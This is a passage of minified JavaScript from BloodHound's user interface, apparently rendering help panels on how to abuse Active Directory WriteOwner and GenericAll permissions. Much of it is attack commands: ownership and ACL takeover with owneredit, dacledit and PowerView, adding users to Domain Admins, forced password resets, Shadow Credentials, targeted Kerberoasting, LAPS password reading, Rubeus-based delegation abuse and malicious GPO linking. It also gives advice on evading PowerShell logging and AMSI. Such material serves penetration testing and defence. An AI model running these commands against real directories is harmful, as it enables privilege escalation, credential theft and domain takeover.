'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"Cleanup of the added ACL can be performed later on with the same tool:"}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'remove' -rights 'FullControl' -principal 'controlledUser' -target 'targetUser' 'domain'/'controlledUser':'password'"}),e.jsx(t,{variant:"body2",children:"With full control of a GPO, you may make modifications to that GPO which will then apply to the users and computers affected by the GPO. Select the target object you wish to push an evil policy down to, then use the gpedit GUI to modify the GPO, using an evil policy that allows item-level targeting, such as a new immediate scheduled task. Then wait at least 2 hours for the group policy client to pick up and execute the new evil policy. See the references tab for a more detailed write up on this abuse."}),e.jsxs(t,{variant:"body2",children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Hackndo/pyGPOAbuse",children:"pyGPOAbuse.py"})," ","can be used for that purpose."]})]});case"OU":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body1",children:"Control of the Organization Unit"}),e.jsx(t,{variant:"body2",children:"With ownership of the OU object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'OUDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."}),e.jsx(t,{variant:"body1",children:"Objects for which ACL inheritance is disabled"}),e.jsx(t,{variant:"body2",children:"It is important to note that the compromise vector described above relies on ACL inheritance and will not work for objects with ACL inheritance disabled, such as objects protected by AdminSDHolder (attribute adminCount=1). This observation applies to any OU child user or computer with ACL inheritance disabled, including objects located in nested sub-OUs."}),e.jsx(t,{variant:"body2",children:"In such a situation, it may still be possible to exploit GenericAll permissions on an OU through an alternative attack vector. Indeed, with GenericAll permissions over an OU, you may make modifications to the gPLink attribute of the OU. The ability to alter the gPLink attribute of an OU may allow an attacker to apply a malicious Group Policy Object (GPO) to all of the OU's child user and computer objects (including the ones located in nested sub-OUs). This can be exploited to make said child objects execute arbitrary commands through an immediate scheduled task, thus compromising them."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsx(t,{variant:"body2",children:"Successful exploitation will require the possibility to add non-existing DNS records to the domain and to create machine accounts. Alternatively, an already compromised domain-joined machine may be used to perform the attack. Note that the attack vector implementation is not trivial and will require some setup."}),e.jsxs(t,{variant:"body2",children:["From a Linux machine, the gPLink manipulation attack vector may be exploited using the"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/synacktiv/OUned",children:"OUned.py"})," ","tool. For a detailed outline of exploit requirements and implementation, you can refer to"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://www.synacktiv.com/publications/ounedpy-exploiting-hidden-organizational-units-acl-attack-vectors-in-active-directory",children:"the article associated to the OUned.py tool"}),"."]}),e.jsx(t,{variant:"body2",children:"Be mindful of the number of users and computers that are in the given OU as they all will attempt to fetch and apply the malicious GPO."}),e.jsx(t,{variant:"body2",children:"Alternatively, the ability to modify the gPLink attribute of an OU can be exploited in conjunction with write permissions on a GPO. In such a situation, an attacker could first inject a malicious scheduled task in the controlled GPO, and then link the GPO to the target OU through its gPLink attribute, making all child users and computers apply the malicious GPO and execute arbitrary commands."})]});case"Container":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:`To change the ownership of the object, you may use Impacket's owneredit example script (cf. "grant ownership" reference for the exact link).`}),e.jsx(t,{component:"pre",children:"owneredit.py -action write -owner 'attacker' -target 'victim' 'DOMAIN'/'USER':'PASSWORD'"}),e.jsx(t,{variant:"body1",children:"Control of the Container"}),e.jsx(t,{variant:"body2",children:"With ownership of the container object, you may grant yourself the GenericAll permission."}),e.jsx(t,{variant:"body1",children:"Generic Descendent Object Takeover"}),e.jsx(t,{variant:"body2",children:`The simplest and most straight forward way to abuse control of the OU is to apply a GenericAll ACE on the OU that will inherit down to all object types. This can be done using Impacket's dacledit (cf. "grant rights" reference for the link).`}),e.jsx(t,{component:"pre",children:"dacledit.py -action 'write' -rights 'FullControl' -inheritance -principal 'JKHOLER' -target-dn 'containerDistinguishedName' 'domain'/'user':'password'"}),e.jsx(t,{variant:"body2",children:'Now, the "JKOHLER" user will have full control of all descendent objects of each type.'}),e.jsx(t,{variant:"body1",children:"Targeted Descendent Object Takeoever"}),e.jsx(t,{variant:"body2",children:"If you want to be more targeted with your approach, it is possible to specify precisely what right you want to apply to precisely which kinds of descendent objects. Refer to the Windows Abuse info for this."})]});case"CertTemplate":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteOwner permission on a certificate template, you can grant yourself ownership over the object to then grant yourself GenericAll. With GenericAll, you may be able to perform an ESC4 attack by modifying the template's attributes. BloodHound will in that case create an ADCSESC4 edge from the principal to the forest domain node."})});case"EnterpriseCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteOwner permission on an enterprise CA, you can grant yourself ownership over the object to then grant yourself GenericAll. With GenericAll, you can publish certificate templates to the enterprise CA by adding the CN name of the template in the enterprise CA object's certificateTemplates attribute. This action may enable you to perform an ADCS domain escalation."})});case"RootCA":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteOwner permission on a root CA, you can grant yourself ownership over the object to then grant yourself GenericAll. With GenericAll, you can make a rogue certificate trusted as a root CA in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"NTAuthStore":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteOwner permission on a NTAuth store, you can grant yourself ownership over the object to then grant yourself GenericAll. With GenericAll, you can make an enterprise CA certificate trusted for NT (domain) authentication in the AD forest by adding the certificate in the root CA object's cACertificate attribute. This action may enable you to perform an ADCS domain escalation."})});case"IssuancePolicy":return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"With WriteOwner permission on an issuance policy object, you can grant yourself ownership over the object to then grant yourself GenericAll. With GenericAll, you create a OID group link to a targeted group by adding the group's distinguishedName in the msDS-OIDToGroupLink attribute of the issuance policy object. This action may enable you to gain membership of the group through an ADCS ESC13 attack."})});default:return e.jsx(e.Fragment,{children:e.jsx(t,{variant:"body2",children:"No abuse information available for this node type."})})}},Jb=()=>e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"This depends on the target object and how to take advantage of this permission. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."}),e.jsx(t,{variant:"body2",children:"When using the PowerView functions, keep in mind that PowerShell v5 introduced several security mechanisms that make it much easier for defenders to see what's going on with PowerShell in their network, such as script block logging and AMSI. You can bypass those security mechanisms by downgrading to PowerShell v2, which all PowerView functions support."}),e.jsx(t,{variant:"body2",children:"Modifying permissions on an object will generate 4670 and 4662 events on the domain controller that handled the request."}),e.jsx(t,{variant:"body2",children:"Additional opsec considerations depend on the target object and how to take advantage of this permission. Opsec considerations for each abuse primitive are documented on the specific abuse edges and on the BloodHound wiki."})]}),Xb=()=>e.jsxs(l,{sx:{overflowX:"auto"},children:[e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm",children:"http://www.selfadsi.org/deep-inside/ad-security-descriptors.htm"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html",children:"https://eladshamir.com/2019/01/28/Wagging-the-Dog.html"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/GhostPack/Rubeus#s4u",children:"https://github.com/GhostPack/Rubeus#s4u"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff",children:"https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/",children:"https://blog.harmj0y.net/redteaming/another-word-on-delegation/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1",children:"https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount",children:"https://github.com/Kevin-Robertson/Powermad#new-machineaccount"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8",children:"https://docs.microsoft.com/en-us/dotnet/api/system.directoryservices.activedirectorysecurityinheritance?view=netframework-4.8"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/eladshamir/Whisker",children:"https://github.com/eladshamir/Whisker"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab",children:"https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf",children:"https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/",children:"https://decoder.cloud/2023/11/20/a-deep-dive-in-cert-publishers-group/"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53",children:"https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://support.microsoft.com/en-us/topic/kb5008383-active-directory-permissions-updates-cve-2021-42291-536d5555-ffba-4248-a60e-d6cbc849cde1",children:"https://support.microsoft.com/en-us/topic/kb5008383-active-directory-permissions-updates-cve-2021-42291-536d5555-ffba-4248-a60e-d6cbc849cde1"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/fb7c101d-ec8b-4fbf-bca8-7d7c2d747d0c",children:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/fb7c101d-ec8b-4fbf-bca8-7d7c2d747d0c"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e5899be4-862e-496f-9a38-33950617d2c5",children:"https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-adts/e5899be4-862e-496f-9a38-33950617d2c5"}),e.jsx("br",{}),e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers",children:"https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-identifiers"})]}),Zb=({sourceName:r,sourceType:a,targetName:o,targetType:i,targetId:s,haslaps:c})=>{switch(i){case"Group":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:'Set-DomainObjectOwner -Credential $Cred -TargetIdentity "Domain Admins" -OwnerIdentity harmj0y'}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the AddMember permission. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:'Add-DomainObjectAcl -Credential $Cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),e.jsx(t,{variant:"body2",children:"You can now add members to the group using the net binary or PowerView's Add-DomainGroupMember."}),e.jsx(t,{variant:"body2",children:'There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net group "Domain Admins" harmj0y /add /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Add-DomainGroupMember function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the AddMember permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab).'}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Add-DomainGroupMember, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainGroupMember, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainGroupMember, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Finally, verify that the user was successfully added to the group with PowerView's Get-DomainGroupMember:"}),e.jsx(t,{component:"pre",children:"Get-DomainGroupMember -Identity 'Domain Admins'"}),e.jsx(t,{variant:"body2",children:"Cleanup for this can be done using Remove-DomainObjectAcl"}),e.jsx(t,{component:"pre",children:'Remove-DomainObjectAcl - Credential $cred -TargetIdentity "Domain Admins" -Rights WriteMembers'}),e.jsx(t,{variant:"body2",children:"Cleanup for the owner can be done by using Set-DomainObjectOwner once again"})]});case"User":return e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity dfm -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a user object, you may grant yourself the GenericAll permission. This can be accomplished using the Add-DomainObjectAcl function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity harmj0y -Rights All"}),e.jsxs(t,{variant:"body2",children:["The GenericAll permission grants ",r," the ability to change the password of the user"," ",o,' without knowing their current password. This is equivalent to the "ForceChangePassword" edge in BloodHound.']}),e.jsxs(t,{variant:"body2",children:["GenericAll also grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsxs(t,{variant:"body2",children:["Alternatively, GenericAll enables ",r," to set a ServicePrincipalName (SPN) on the targeted user, which may be abused in a Targeted Kerberoast attack."]}),e.jsx(t,{variant:"body1",children:" Force Change Password attack "}),e.jsx(t,{variant:"body2",children:"There are at least two ways to execute this attack. The first and most obvious is by using the built-in net.exe binary in Windows (e.g.: net user dfm.a Password123! /domain). See the opsec considerations tab for why this may be a bad idea. The second, and highly recommended method, is by using the Set-DomainUserPassword function in PowerView. This function is superior to using the net.exe binary in several ways. For instance, you can supply alternate credentials, instead of needing to run a process as or logon as the user with the ForceChangePassword permission. Additionally, you have much safer execution options than you do with spawning net.exe (see the opsec tab)."}),e.jsxs(t,{variant:"body2",children:["To abuse this permission with PowerView's Set-DomainUserPassword, first import PowerView into your agent session or into a PowerShell instance at the console. You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainUserPassword, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsx(t,{variant:"body2",children:"Then create a secure string object for the password you want to set on the target user:"}),e.jsx(t,{component:"pre",children:"$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force"}),e.jsxs(t,{variant:"body2",children:["Finally, use Set-DomainUserPassword, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred"}),e.jsx(t,{variant:"body2",children:"Now that you know the target user's plain text password, you can either start a new agent as that user, or use that user's credentials in conjunction with PowerView's ACL abuse functions, or perhaps even RDP to a system the target user has access to. For more ideas and information, see the references tab."}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Targeted Kerberoast attack "}),e.jsx(t,{variant:"body2",children:"A targeted kerberoast attack can be performed using PowerView's Set-DomainObject along with Get-DomainSPNTicket."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObject, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObject, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}"}),e.jsx(t,{variant:"body2",children:"After running this, you can use Get-DomainSPNTicket as follows:"}),e.jsx(t,{component:"pre",children:"Get-DomainSPNTicket -Credential $Cred harmj0y | fl"}),e.jsx(t,{variant:"body2",children:"The recovered hash can be cracked offline using the tool of your choice. Cleanup of the ServicePrincipalName can be done with the Set-DomainObject command:"}),e.jsx(t,{component:"pre",children:"Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname"})]});case"Computer":return c?e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Set-DomainObjectOwner, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Set-DomainObjectOwner -Credential $Cred -TargetIdentity windows1 -OwnerIdentity harmj0y"}),e.jsx(t,{variant:"body2",children:"To abuse ownership of a computer object, you may grant yourself the GenericAll permission."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Add-DomainObjectAcl, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\dfm.a', $SecPassword)`}),e.jsxs(t,{variant:"body2",children:["Then, use Add-DomainObjectAcl, optionally specifying $Cred if you are not already running a process as ",r,":"]}),e.jsx(t,{component:"pre",children:"Add-DomainObjectAcl -Credential $Cred -TargetIdentity windows1 -Rights All"}),e.jsxs(t,{variant:"body2",children:["The GenericAll permission grants ",r," the ability to obtain the LAPS (RID 500 administrator) password of ",o,"."]}),e.jsxs(t,{variant:"body2",children:["GenericAll also grants ",r,' the permission to write to the "msds-KeyCredentialLink" attribute of ',o,'. Writing to this property allows an attacker to create "Shadow Credentials" on the object and authenticate as the principal using kerberos PKINIT. This is equivalent to the "AddKeyCredentialLink" edge.']}),e.jsx(t,{variant:"body2",children:"Alternatively, GenericAll on a computer object can be used to perform a Resource-Based Constrained Delegation attack."}),e.jsx(t,{variant:"body1",children:" Retrieve LAPS Password "}),e.jsxs(t,{variant:"body2",children:["For systems using legacy LAPS, the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwd"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- ms-Mcs-AdmPwdExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{})]}),e.jsxs(t,{variant:"body2",children:["For systems using Windows LAPS (2023 edition), the following AD computer object properties are relevant:",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-Password"}),": The plaintext LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-PasswordExpirationTime"}),": The LAPS password expiration time",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPassword"}),": The encrypted LAPS password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedPasswordHistory"}),": The encrypted LAPS password history",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPassword"}),": The encrypted Directory Services Restore Mode (DSRM) password",e.jsx("br",{}),e.jsx("b",{children:"- msLAPS-EncryptedDSRMPasswordHistory"}),": The encrypted DSRM password history",e.jsx("br",{})]}),e.jsx(t,{variant:"body2",children:"Plaintext attributes can be read using a simple LDAP client. For example, with PowerView:"}),e.jsx(t,{component:"pre",children:'Get-DomainComputer "MachineName" -Properties "cn","ms-mcs-admpwd","ms-mcs-admpwdexpirationtime"'}),e.jsx(t,{variant:"body2",children:"Encrypted attributes can be decrypted using Microsoft's LAPS PowerShell module. For example:"}),e.jsx(t,{component:"pre",children:'Get-LapsADPassword "WIN10" -AsPlainText'}),e.jsxs(t,{variant:"body2",children:["The encrypted attributes can also be retrieved and decrypted using"," ",e.jsx(n,{target:"_blank",rel:"noopener noreferrer",href:"https://github.com/xpn/RandomTSScripts/tree/master/lapsv2decrypt",children:"lapsv2decrypt"})," ","(dotnet or BOF)."]}),e.jsx(t,{variant:"body1",children:" Shadow Credentials attack "}),e.jsx(t,{variant:"body2",children:"To abuse the permission, use Whisker. "}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"||a==="Computer"?`${r} if you are not running a process as that user/computer`:`a member of ${r} if you are not running a process as a member`]}),e.jsx(t,{component:"pre",children:"Whisker.exe add /target:<TargetPrincipal>"}),e.jsx(t,{variant:"body2",children:"For other optional parameters, view the Whisker documentation."}),e.jsx(t,{variant:"body1",children:" Resource-Based Constrained Delegation attack "}),e.jsx(t,{variant:"body2",children:"Abusing this primitive is possible through the Rubeus project."}),e.jsx(t,{variant:"body2",children:"First, if an attacker does not control an account with an SPN set, Kevin Robertson's Powermad project can be used to add a new attacker-controlled computer account:"}),e.jsx(t,{component:"pre",children:"New-MachineAccount -MachineAccount attackersystem -Password $(ConvertTo-SecureString 'Summer2018!' -AsPlainText -Force)"}),e.jsx(t,{variant:"body2",children:"PowerView can be used to then retrieve the security identifier (SID) of the newly created computer account:"}),e.jsx(t,{component:"pre",children:"$ComputerSid = Get-DomainComputer attackersystem -Properties objectsid | Select -Expand objectsid"}),e.jsx(t,{variant:"body2",children:"We now need to build a generic ACE with the attacker-added computer SID as the principal, and get the binary bytes for the new DACL/ACE:"}),e.jsx(t,{component:"pre",children:`$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"
$SDBytes = New-Object byte[] ($SD.BinaryLength)
$SD.GetBinaryForm($SDBytes, 0)`}),e.jsx(t,{variant:"body2",children:"Next, we need to set this newly created security descriptor in the msDS-AllowedToActOnBehalfOfOtherIdentity field of the computer account we're taking over, again using PowerView in this case:"}),e.jsx(t,{component:"pre",children:"Get-DomainComputer $TargetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}"}),e.jsx(t,{variant:"body2",children:"We can then use Rubeus to hash the plaintext password into its RC4_HMAC form:"}),e.jsx(t,{component:"pre",children:"Rubeus.exe hash /password:Summer2018!"}),e.jsx(t,{variant:"body2",children:`And finally we can use Rubeus' *s4u* module to get a service ticket for the service name (sname) we want to "pretend" to be "admin" for. This ticket is injected (thanks to /ptt), and in this case grants us access to the file system of the TARGETCOMPUTER:`}),e.jsx(t,{component:"pre",children:"Rubeus.exe s4u /user:attackersystem$ /rc4:EF266C6B963C0BB683941032008AD47F /impersonateuser:admin /msdsspn:cifs/TARGETCOMPUTER.testlab.local /ptt"})]}):e.jsxs(e.Fragment,{children:[e.jsx(t,{variant:"body2",children:"To change the ownership of the object, you may use the Set-DomainObjectOwner function in PowerView."}),e.jsxs(t,{variant:"body2",children:["You may need to authenticate to the Domain Controller as"," ",a==="User"?`${r} if you are not running a process as that user`:`a member of ${r} if you are not running a process as a member`,". To do this in conjunction with Set-DomainObjectOwner, first create a PSCredential object (these examples comes from the PowerView help documentation):"]}),e.jsx(t,{component:"pre",children:`$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
